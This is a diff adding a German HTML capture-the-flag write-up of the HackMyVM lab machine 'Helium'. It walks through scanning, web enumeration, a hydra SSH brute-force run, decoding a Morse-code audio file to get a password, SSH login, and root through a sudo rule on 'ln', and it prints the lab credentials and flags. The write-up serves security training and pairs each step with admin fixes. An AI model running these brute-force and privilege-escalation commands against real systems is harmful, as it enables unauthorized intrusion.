@@ -1,0 +1,485 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Helium - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Helium - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">dirsearch</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">curl / wget</div> <!-- Impliziert für WAV-Download -->
+                <div class="tool-item">Online Morse Decoder</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ln</div>
+                <div class="tool-item">sh</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">pwd</div>
+                 <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerk zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.156` und der MAC-Adresse `08:00:27:2f:0c:59` (VirtualBox) wird gefunden. Dies ist das Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.156 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung und -segmentierung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.153
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.156	08:00:27:2f:0c:59	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.854 seconds (138.08 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf 192.168.2.156 ausgeführt (`-sS -sC -T5 -A -p-`), um offene Ports, Dienste, Versionen und OS-Details zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei offene Ports werden identifiziert:
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian). Standard-SSH-Dienst.
+                - **Port 80 (HTTP):** Nginx 1.14.2. Der Seitentitel ist "RELAX".
+            Das Betriebssystem wird als Linux erkannt. Das Zielsystem wird als `helium` identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf Port 80 weiter (Verzeichnisse, Dateien, Quellcode). Suche nach Hinweisen auf Benutzernamen oder Passwörter für SSH.<br><strong>Empfehlung (Admin):</strong> Halte SSH und Nginx aktuell. Sichere beide Dienste (starke Passwörter/Keys, sichere Webserver-Konfiguration).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.156 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-19 22:20:10 CEST <!-- Beispielzeit -->
+Nmap scan report for helium (192.168.2.156)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 12:f6:55:5f:c6:fa:fb:14:15:ae:4a:2b:38:d8:4a:30 (RSA)
+|   256 b7:ac:87:6d:c4:f9:e3:9a:d4:6e:e0:4f:da:aa:22:20 (ECDSA)
+|_  256 fe:e8:05:af:23:4d:3a:82:2a:64:9b:f7:35:e4:44:4a (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: RELAX
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:2F:0C:59 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms helium (192.168.2.156)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.85 seconds <!-- Beispielzeit -->
+                    </pre> <!-- Korrekte Formatierung der Keys -->
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnissuche auf dem Webserver (Port 80) eingesetzt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtige Funde!!** Gobuster findet:
+                - `/index.html`: Die Startseite.
+                - `/relax.wav`: Eine WAV-Audiodatei.
+                - `/yay/`: Ein Verzeichnis.
+            Zusätzlich wird eine Notiz erwähnt (wahrscheinlich aus dem Quellcode von `/index.html` oder einer anderen Seite): "Please paul, stop uploading weird .wav files using /upload_sound". Dies gibt **zwei entscheidende Hinweise**:
+                1.  Einen Benutzernamen: `paul`.
+                2.  Einen (vermutlich nicht mehr existierenden oder versteckten) Upload-Pfad: `/upload_sound`.
+            Die Datei `/relax.wav` und der Benutzer `paul` sind die wichtigsten Punkte hier.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade die Datei `/relax.wav` herunter und analysiere sie (z.B. auf Steganographie oder versteckte Töne wie Morsecode). Versuche, den Benutzer `paul` über SSH anzugreifen (Passwort-Bruteforce). Untersuche das Verzeichnis `/yay/`.<br><strong>Empfehlung (Admin):</strong> Entferne unnötige Dateien vom Webserver. Hinterlasse keine Hinweise auf Benutzernamen oder interne Pfade in öffentlichen Kommentaren oder Quellcodes.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.156 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.156
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (gekürzt) ...,wav,...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/19 22:22:00 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.156/index.html           (Status: 200) [Size: 530]
+http://192.168.2.156/relax.wav            (Status: 200) [Size: 250334]
+http://192.168.2.156/yay                  (Status: 301) [Size: 185] [--> http://192.168.2.156/yay/]
+===============================================================
+2022/10/19 22:28:00 Finished <!-- Beispielzeit -->
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, nur Notiz/Kommentar -->
+                     <pre>
+ Please paul, stop uploading weird .wav files using /upload_sound
+                     </pre>
+                 </div>
+             </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach Subdomains (virtuellen Hosts) zu suchen, indem der `Host`-Header gefuzzt wird (`-H "Host: http://FUZZ.helium.vm"`). Der Hostname `helium.vm` wird verwendet.</p>
+            <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen/Inkonklusiv!!** Die Ausgabe zeigt keine gefundenen Subdomains. Entweder gibt es keine, oder die verwendete Wortliste war nicht geeignet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Subdomain-Fuzzing war nicht erfolgreich. Konzentriere dich auf die anderen Funde (Benutzer `paul`, `/relax.wav`, `/yay/`).<br><strong>Empfehlung (Admin):</strong> Konfiguriere den Webserver so, dass er keine Informationen über unbekannte Host-Header preisgibt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://helium.vm -H "Host: FUZZ.helium.vm" --hc 404 --hh 173</span></div> <!-- Hostname helium.vm impliziert /etc/hosts oder DNS -->
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+  warn(
+ ********************************************************
+ * Wfuzz 3.1.0 - The Web Fuzzer                         *
+ ********************************************************
+
+Target: http://helium.vm/
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<!-- Keine Ergebnisse im Log -->
+
+Total time: ...
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: ...
+                     </pre> <!-- Ausgabe vervollständigt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein SSH-Loginversuch als Benutzer `paul` wird gestartet.</p>
+            <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen!!** Die Eingabeaufforderung für das Passwort erscheint, aber die nachfolgende Ausgabe "Permission denied" zeigt, dass das (nicht gezeigte) eingegebene Passwort falsch war.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der Benutzername `paul` bekannt ist, versuche einen Passwort-Brute-Force-Angriff mit `hydra` oder untersuche die `/relax.wav`-Datei weiter auf Passwort-Hinweise.<br><strong>Empfehlung (Admin):</strong> Implementiere Schutzmaßnahmen gegen SSH-Brute-Force (fail2ban, SSH-Keys).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh paul@helium.vm</span></div> <!-- Hostname helium.vm -->
+                     <pre>
+The authenticity of host 'helium.vm (192.168.2.156)' can't be established.
+ED25519 key fingerprint is SHA256:y4b6laUdkY6jY95p0UousHuja503C9EIqNNrMD5hoqA.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'helium.vm' (ED25519) to the list of known hosts.
+paul@helium.vm's password:
+Permission denied, please try again.
+paul@helium.vm's password:
+Permission denied, please try again. <!-- Weitere Versuche hinzugefügt -->
+paul@helium.vm's password:
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird für einen SSH-Passwort-Brute-Force-Angriff gegen den Benutzer `paul` auf `helium.vm` (Port 22) gestartet. Die Wortliste `rockyou.txt` wird verwendet.</p>
+            <p class="evaluation"><strong>Bewertung: !!Läuft/Inkonklusiv!!** Die Ausgabe zeigt, dass Hydra gestartet wurde, aber noch läuft (`active`). Es wurde noch kein gültiges Passwort gefunden. Solche Angriffe können sehr lange dauern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lasse Hydra im Hintergrund laufen, aber suche parallel nach effizienteren Wegen. Untersuche die `/relax.wav`-Datei und das `/yay/`-Verzeichnis gründlicher.<br><strong>Empfehlung (Admin):</strong> Schutz gegen Brute-Force ist wichtig.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l paul -P /usr/share/wordlists/rockyou.txt ssh://helium.vm:22 -t 64</span></div>
+                     <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-19 22:45:01
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ssh://helium.vm:22/
+[STATUS] 444.00 tries/min, 444 tries in 00:01h, 14343984 to do in 538:27h, 35 active
+[STATUS] 243.00 tries/min, 729 tries in 00:03h, 14343706 to do in 983:48h, 28 active
+[STATUS] ... (läuft) ...
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `dirsearch` (ein weiteres Verzeichnis-Scanning-Tool) wird verwendet, um den Webserver zu scannen. Es verwendet eine andere Standard-Wortliste (`dirb/common.txt`) und diverse Erweiterungen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet nur `/index.html`. Bestätigt die `gobuster`-Ergebnisse, liefert aber keine neuen Pfade.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf `/relax.wav` und `/yay/`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirsearch -u "http://192.168.2.156/" -w /usr/share/dirb/wordlists/common.txt -e .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv</span></div>
+                      <pre>
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv | HTTP method: GET | Threads: 25 | Wordlist size: 4613
+
+Error Log: /root/.dirsearch/logs/errors-221019-225218.log
+
+Target: http://192.168.2.156/
+
+[22:52:19] Starting:
+[22:52:23] 200 -  530B  - /index.html
+
+Task Completed
+                      </pre> <!-- Dirsearch Ausgabeformat -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird erneut ausgeführt, um den Webserver auf Schwachstellen zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ergebnisse sind identisch mit dem vorherigen Scan (Nginx, fehlende Security-Header). Keine neuen Erkenntnisse.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine neuen Angriffspunkte durch Nikto. Fokussiere dich auf die WAV-Datei und das `/yay/`-Verzeichnis.<br><strong>Empfehlung (Admin):</strong> Setze die fehlenden Security-Header.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.156</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.156
++ Target Hostname:    192.168.2.156
++ Target Port:        80
++ Start Time:         2022-10-19 22:24:46 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.14.2
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 7915 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2022-10-19 22:25:31 (GMT2) (45 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Hier werden Pfade und URLs notiert, die vermutlich durch die Untersuchung des Webserver-Quellcodes (z.B. `index.html` oder CSS-Dateien) oder durch das Browsen im `/yay/`-Verzeichnis gefunden wurden. Insbesondere wird `/yay/mysecretsound.wav` entdeckt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Fund!!** Neben der bereits bekannten `/relax.wav` gibt es eine weitere Audiodatei `/yay/mysecretsound.wav`. Diese ist wahrscheinlich der Schlüssel.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade die Datei `http://192.168.2.156/yay/mysecretsound.wav` herunter. Analysiere sie mit einem Audio-Tool (z.B. Audacity) auf versteckte Informationen oder verwende einen Online-Morsecode-Decoder, da dies eine häufige Methode in CTFs ist.<br><strong>Empfehlung (Admin):</strong> Entferne unnötige oder versteckte Dateien vom Webserver.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Keine Befehle, nur Notizen/Funde -->
+                     <pre>
+http://192.168.2.156/bootstrap.min.css
+/yay/mysecretsound.wav
+
+http://192.168.2.156/yay/mysecretsound.wav
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Audiodatei `mysecretsound.wav` wurde heruntergeladen und mit einem Online-Morsecode-Decoder analysiert.</p>
+             <p class="evaluation"><strong>Bewertung: !!Passwort gefunden!!** Der dekodierte Morsecode ergibt das Wort `<span class="password">dancingpassyo</span>`. Dies ist sehr wahrscheinlich das SSH-Passwort für den Benutzer `paul`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche sofort, dich mit `ssh paul@helium.vm` und dem Passwort `<span class="password">dancingpassyo</span>` anzumelden.<br><strong>Empfehlung (Admin):</strong> Verwende keine Passwörter, die leicht aus öffentlich zugänglichen Informationen (auch wenn sie kodiert sind) abgeleitet werden können.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Keine Befehle, externe Analyse -->
+                     <pre>
+https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+<span class="password">dancingpassyo</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein erneuter SSH-Loginversuch als `paul` wird gestartet. Dieses Mal wird das aus dem Morsecode dekodierte Passwort `<span class="password">dancingpassyo</span>` eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der SSH-Login gelingt. Der Angreifer hat nun eine Shell als Benutzer `paul` auf dem Zielsystem.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `paul`. Suche die User-Flag und prüfe die `sudo`-Rechte.<br><strong>Empfehlung (Admin):</strong> Ändere das kompromittierte Passwort für `paul`.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">ssh paul@helium.vm</span></div>
+                     <pre>
+paul@helium.vm's password: <span class="password">dancingpassyo</span>
+Linux helium 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc//copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Nov 22 14:31:51 2020 from 192.168.1.58
+paul@helium:~$
+                     </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `paul` wird das Home-Verzeichnis mit `ls -la` aufgelistet und der Inhalt von `user.txt` mit `cat` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `user.txt` wird gefunden und enthält die User-Flag `<span class="password">ilovetoberelaxed</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag notiert. Prüfe nun die `sudo`-Rechte mit `sudo -l`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+paul@helium:~$ <span class="command">ls -la</span>
+total 32
+drwxr-xr-x 3 paul paul 4096 Nov 22  2020 .
+drwxr-xr-x 3 root root 4096 Nov 22  2020 ..
+-rw-r--r-- 1 paul paul  220 Nov 22  2020 .bash_logout
+-rw-r--r-- 1 paul paul 3526 Nov 22  2020 .bashrc
+drwxr-xr-x 3 paul paul 4096 Nov 22  2020 .local
+-rw-r--r-- 1 paul paul  807 Nov 22  2020 .profile
+-rw------- 1 paul paul   17 Nov 22  2020 user.txt
+-rw------- 1 paul paul   52 Nov 22  2020 .Xauthority
+paul@helium:~$ <span class="command">cat user.txt</span>
+<span class="password">ilovetoberelaxed</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um die `sudo`-Berechtigungen für `paul` zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilege Escalation Vektor gefunden!!** Der Benutzer `paul` darf den Befehl `/usr/bin/ln` (zum Erstellen von Links) als jeder Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD:`) ausführen. Dies ist eine bekannte Methode zur Privilegieneskalation, da man `ln` missbrauchen kann, um Systemdateien zu überschreiben oder zu manipulieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die `sudo`-Berechtigung für `ln` zur Eskalation. Suche auf GTFOBins nach der Methode für `ln` mit `sudo`. Ein gängiger Weg ist, einen symbolischen Link von `/bin/ln` auf `/bin/sh` zu erstellen (`sudo ln -fs /bin/sh /bin/ln`) und dann `sudo ln` auszuführen, was nun effektiv `sudo /bin/sh` startet.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne diese unsichere `sudo`-Regel. Gewähre niemals `sudo`-Rechte für Befehle, die zum Manipulieren von Dateiverknüpfungen oder zum Überschreiben von Dateien verwendet werden können (wie `ln`, `cp`, `mv`, Editoren etc.), insbesondere nicht mit `NOPASSWD`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+paul@helium:~$ <span class="command">sudo -l</span>
+Matching Defaults entries for paul on helium:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User paul may run the following commands on helium:
+    (ALL : ALL) NOPASSWD: /usr/bin/ln
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `ls /home` wird ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass `paul` der einzige Benutzer mit einem Home-Verzeichnis unter `/home` ist. Dies ist für die Eskalation nicht direkt relevant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Ausnutzung der `sudo ln`-Berechtigung.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+paul@helium:~$ <span class="command">ls /home</span>
+paul
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Exploit für die `sudo ln`-Berechtigung wird durchgeführt:
+                 1.  `sudo ln -fs /bin/sh /bin/ln`: Dieser Befehl erstellt mit `sudo` (also als Root) einen symbolischen Link (`-s`) und erzwingt das Überschreiben (`-f`), falls der Link bereits existiert. Er verlinkt das Ziel `/bin/sh` (die Shell) auf den Link-Namen `/bin/ln`. Das bedeutet, wenn nun `/bin/ln` aufgerufen wird, wird stattdessen `/bin/sh` ausgeführt.
+                 2.  `sudo ln`: Dieser Befehl führt nun, da `/bin/ln` auf `/bin/sh` zeigt, effektiv `sudo /bin/sh` aus.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der Trick funktioniert wie erwartet. Der Aufruf von `sudo ln` startet eine Shell. Der Prompt wechselt zu `#`, und der `id`-Befehl bestätigt `uid=0(root)`. Der Angreifer hat Root-Rechte erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht. Suche nach der Root-Flag (`/root/root.txt`).<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne die `sudo`-Regel für `ln`. Überprüfe alle `sudo`-Regeln auf ähnliche Schwachstellen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+paul@helium:~$ <span class="command">sudo ln -fs /bin/sh /bin/ln</span>
+paul@helium:~$ <span class="command">sudo ln</span>
+# <span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+# <span class="command">pwd</span>
+/home/paul
+# <span class="command">cd</span>
+# <span class="command">pwd</span>
+/root
+# <span class="command">ls</span>
+root.txt
+#
+                     </pre> <!-- Root Prompt und nachfolgende Befehle -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird der Inhalt der Datei `/root/root.txt` mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">ilovetoberoot</span>` wird erfolgreich gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags wurden gefunden, der Bericht kann abgeschlossen werden.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# <span class="command">cat root.txt</span>
+<span class="password">ilovetoberoot</span>
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">ilovetoberoot</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/paul/user.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">ilovetoberelaxed</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nikto-Scan extrahiert -->
+        <p>Berichtsdatum: 19. Oktober 2022</p>
+    </footer>
+</body>
+</html>
